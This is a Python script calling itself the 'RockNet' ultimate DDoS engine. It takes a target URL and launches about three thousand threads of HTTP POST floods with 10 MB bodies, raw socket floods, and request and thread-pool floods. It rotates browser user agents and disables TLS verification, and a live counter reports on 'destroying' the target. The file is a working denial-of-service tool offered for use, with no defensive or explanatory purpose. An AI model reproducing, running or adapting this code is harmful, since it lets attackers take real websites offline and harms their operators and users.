#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from pyfiglet import Figlet
import random
import threading
import socket
import http.client
import sys
from datetime import datetime
import json
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors (safe for all platforms)
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Banner
try:
    art = Figlet(font='drpepper')
    print(Colors.RED + Colors.BOLD + art.renderText("RockNet") + Colors.END)
except:
    print(Colors.RED + Colors.BOLD + "=== ROCKNET DDOS ===" + Colors.END)

print(Colors.CYAN + "="*60 + Colors.END)
print(Colors.YELLOW + Colors.BOLD + "     ULTIMATE DDOS ENGINE v10.0".center(60) + Colors.END)
print(Colors.CYAN + "="*60 + Colors.END)

# Creator Info
print(Colors.PURPLE + Colors.BOLD + "  ╔══════════════════════════════════════════════╗" + Colors.END)
print(Colors.PURPLE + Colors.BOLD + "  ║      CREATOR: v0LDm0Rte                      ║" + Colors.END)
print(Colors.PURPLE + Colors.BOLD + "  ║      VERSION: v.1.0.1                        ║" + Colors.END)
print(Colors.PURPLE + Colors.BOLD + "  ║      STATUS: ELITE EDITION                   ║" + Colors.END)
print(Colors.PURPLE + Colors.BOLD + "  ╚══════════════════════════════════════════════╝" + Colors.END)
print(Colors.CYAN + "="*60 + Colors.END)

# Input
print(Colors.GREEN + "\n[+] Enter Target URL: " + Colors.END)
url = input("➜ ")

domain = url.replace('http://', '').replace('https://', '').split('/')[0]
path = '/' + '/'.join(url.replace('http://', '').replace('https://', '').split('/')[1:]) if '/' in url.replace('http://', '').replace('https://', '') else '/'
port = 443 if url.startswith('https') else 80

# User Agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
]

# Statistics
total_requests = 0
success_requests = 0
failed_requests = 0
stats_lock = threading.Lock()

# Heavy Data
HEAVY_DATA = {'data': 'X' * 10000000}

# Attack Function 1: HTTP Flood
def http_flood():
    global total_requests, success_requests, failed_requests
    while True:
        try:
            conn = http.client.HTTPConnection(domain)
            headers = {'User-Agent': random.choice(user_agents), 'Host': domain}
            conn.request("POST", path, body=HEAVY_DATA['data'], headers=headers)
            conn.getresponse()
            conn.close()
            with stats_lock:
                total_requests += 1
                success_requests += 1
        except:
            with stats_lock:
                total_requests += 1
                failed_requests += 1

# Attack Function 2: Socket Flood
def socket_flood():
    global total_requests, success_requests, failed_requests
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((domain, port))
            request = f"GET {path} HTTP/1.1\r\nHost: {domain}\r\n\r\n"
            sock.send(request.encode())
            sock.close()
            with stats_lock:
                total_requests += 1
                success_requests += 1
        except:
            with stats_lock:
                total_requests += 1
                failed_requests += 1

# Attack Function 3: Requests Flood
def requests_flood():
    global total_requests, success_requests, failed_requests
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            requests.get(url, headers=headers, timeout=0.01, verify=False)
            requests.post(url, json=HEAVY_DATA, headers=headers, timeout=0.01, verify=False)
            with stats_lock:
                total_requests += 2
                success_requests += 2
        except:
            with stats_lock:
                total_requests += 2
                failed_requests += 2

# Attack Function 4: ThreadPool Attack
def thread_pool_attack():
    while True:
        try:
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = []
                for _ in range(500):
                    futures.append(executor.submit(single_request))
                for future in as_completed(futures):
                    pass
        except:
            pass

def single_request():
    global total_requests, success_requests, failed_requests
    try:
        headers = {'User-Agent': random.choice(user_agents)}
        requests.get(url, headers=headers, timeout=0.01, verify=False)
        with stats_lock:
            total_requests += 1
            success_requests += 1
    except:
        with stats_lock:
            total_requests += 1
            failed_requests += 1

# Target Info
print(Colors.GREEN + "\n" + "="*60 + Colors.END)
print(Colors.CYAN + Colors.BOLD + "TARGET".center(60) + Colors.END)
print(Colors.GREEN + "="*60 + Colors.END)
print(Colors.YELLOW + f"  Domain: {Colors.WHITE}{domain}")
print(Colors.YELLOW + f"  Port: {Colors.WHITE}{port}")
print(Colors.GREEN + "="*60 + Colors.END)

print(Colors.RED + Colors.BOLD + "\nSTARTING ATTACK...".center(60) + Colors.END)
print(Colors.GREEN + "="*60 + Colors.END)

# Start threads
threads = []

print(Colors.GREEN + "[+] HTTP Flood - 1000 threads" + Colors.END)
for _ in range(1000):
    t = threading.Thread(target=http_flood, daemon=True)
    t.start()
    threads.append(t)

print(Colors.GREEN + "[+] Socket Flood - 1000 threads" + Colors.END)
for _ in range(1000):
    t = threading.Thread(target=socket_flood, daemon=True)
    t.start()
    threads.append(t)

print(Colors.GREEN + "[+] Requests Flood - 1000 threads" + Colors.END)
for _ in range(1000):
    t = threading.Thread(target=requests_flood, daemon=True)
    t.start()
    threads.append(t)

print(Colors.GREEN + "[+] ThreadPool Attack - 50 threads" + Colors.END)
for _ in range(50):
    t = threading.Thread(target=thread_pool_attack, daemon=True)
    t.start()
    threads.append(t)

print(Colors.RED + Colors.BOLD + "\n[🔥] ATTACK RUNNING" + Colors.END)
print(Colors.RED + Colors.BOLD + "[💀] DESTROYING TARGET" + Colors.END)
print(Colors.CYAN + "="*60 + Colors.END)

start_time = time.time()

try:
    while True:
        time.sleep(2)
        elapsed = int(time.time() - start_time)
        with stats_lock:
            # Clear screen safely
            try:
                import os
                os.system('cls' if os.name == 'nt' else 'clear')
            except:
                pass
            
            print(Colors.CYAN + "="*60 + Colors.END)
            print(Colors.RED + Colors.BOLD + "LIVE STATS".center(60) + Colors.END)
            print(Colors.CYAN + "="*60 + Colors.END)
            
            # Creator Info in Stats
            print(Colors.PURPLE + f"  [v0LDm0Rte] v.1.0.1".center(60) + Colors.END)
            print(Colors.CYAN + "-"*60 + Colors.END)
            
            print(Colors.YELLOW + f"  Time: {Colors.WHITE}{elapsed}s")
            print(Colors.GREEN + f"  Total Requests: {Colors.WHITE}{total_requests:,}")
            print(Colors.GREEN + f"  Successful: {Colors.WHITE}{success_requests:,}")
            print(Colors.RED + f"  Failed: {Colors.WHITE}{failed_requests:,}")
            
            req_per_sec = int(total_requests / elapsed) if elapsed > 0 else 0
            print(Colors.CYAN + f"  Speed: {Colors.WHITE}{req_per_sec:,} req/s")
            print(Colors.PURPLE + f"  Threads: {Colors.WHITE}{threading.active_count():,}")
            
            # Progress
            progress = min(100, (elapsed / 30) * 100)
            bar = '█' * int(progress/2) + '░' * (50 - int(progress/2))
            print(Colors.CYAN + f"  [{bar}] {progress:.0f}%" + Colors.END)
            
            print(Colors.RED + Colors.BOLD + "  STATUS: ATTACKING".center(60) + Colors.END)
            print(Colors.CYAN + "="*60 + Colors.END)
            print(Colors.YELLOW + "  CTRL+C to stop".center(60) + Colors.END)
            print(Colors.CYAN + "="*60 + Colors.END)
            
except KeyboardInterrupt:
    print(Colors.RED + Colors.BOLD + "\n\n" + "="*60 + Colors.END)
    print(Colors.YELLOW + Colors.BOLD + "STOPPED".center(60) + Colors.END)
    print(Colors.RED + "="*60 + Colors.END)
    print(Colors.GREEN + f"  Total: {Colors.WHITE}{total_requests:,} requests")
    print(Colors.GREEN + f"  Time: {Colors.WHITE}{int(time.time() - start_time)}s")
    print(Colors.GREEN + f"  Speed: {Colors.WHITE}{int(total_requests / (time.time() - start_time)):,} req/s")
    print(Colors.RED + "="*60 + Colors.END)
    print(Colors.RED + Colors.BOLD + "  TARGET DESTROYED".center(60) + Colors.END)
    print(Colors.PURPLE + Colors.BOLD + "  Created by: v0LDm0Rte".center(60) + Colors.END)
    print(Colors.PURPLE + Colors.BOLD + "  Version: v.1.0.1".center(60) + Colors.END)
    print(Colors.RED + "="*60 + Colors.END)
    sys.exit(0)
